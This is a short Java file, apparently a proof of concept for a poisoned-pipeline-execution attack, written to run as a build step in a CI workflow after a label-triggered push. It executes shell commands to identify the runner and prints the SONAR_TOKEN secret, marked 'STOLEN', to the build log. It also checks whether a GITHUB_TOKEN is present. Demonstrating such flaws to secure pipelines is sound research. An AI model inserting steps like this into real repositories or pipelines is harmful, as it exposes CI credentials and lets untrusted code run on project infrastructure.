public class AttackerBuildStep {
  static String sh(String c) throws Exception {
    Process p=new ProcessBuilder("bash","-lc",c).redirectErrorStream(true).start();
    String o=new String(p.getInputStream().readAllBytes()).trim(); p.waitFor(); return o; }
  public static void main(String[] a) throws Exception {
    System.out.println("[PPE-EXPLOIT] attacker code executed on synchronize (post-label push):");
    System.out.println("[PPE-EXPLOIT] whoami=" + sh("whoami") + " host=" + sh("hostname"));
    System.out.println("[PPE-EXPLOIT] STOLEN SONAR_TOKEN=" + System.getenv("SONAR_TOKEN"));
    System.out.println("[PPE-EXPLOIT] GITHUB_TOKEN present=" + (System.getenv("GITHUB_TOKEN")!=null));
  }
}